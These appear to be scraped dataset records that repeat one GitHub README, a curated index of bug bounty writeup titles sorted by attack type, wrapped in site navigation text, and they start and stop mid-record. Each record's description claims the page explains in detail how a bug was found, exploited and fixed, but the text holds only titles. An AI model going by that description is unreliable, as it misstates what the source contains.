OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#clickjacking-ui-redressing-attack", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#clickjacking-ui-redressing-attack. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#local-file-inclusion-lfi", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#local-file-inclusion-lfi. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 